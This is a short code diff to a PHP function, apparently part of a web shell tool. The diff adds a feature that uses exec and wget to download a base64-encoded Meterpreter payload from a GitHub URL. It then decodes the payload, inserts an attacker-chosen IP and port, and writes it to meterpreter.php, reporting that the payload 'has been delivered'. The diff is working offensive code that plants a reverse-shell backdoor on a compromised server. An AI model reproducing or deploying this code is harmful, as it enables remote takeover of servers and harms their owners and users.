@@ -121,10 +121,12 @@ function featureMeterpreter($cmd){
     $port = $args[2];
     $num = intval($port);
     if (is_numeric($port) && $num >= 1 && $num <= 65535){
+        exec('IP="'.$ip.'"; PORT="'.$port.'"; wget https://raw.githubusercontent.com/GeenStack/KeftemeWS/main/Modules/meterpreter_encoded.txt -O meterpreter_encoded.txt; cat meterpreter_encoded.txt | base64 -d | sed "s/8\.8\.8\.8/$IP/g;s/8888/$PORT/g" > meterpreter.php');
+        
         return array(
-            'stdout' => array('Norm port'),
+            'stdout' => array('PHP Meterpreter has been delivered. Go to ./meterpreter.php'),
             'cwd' => getcwd()
-        );
+        ); 
     }
     
     else{
@@ -134,10 +136,6 @@ function featureMeterpreter($cmd){
         );       
     }
 
-    return array(
-        'stdout' => array($args[2]),
-        'cwd' => getcwd()
-    );
 }
 
 
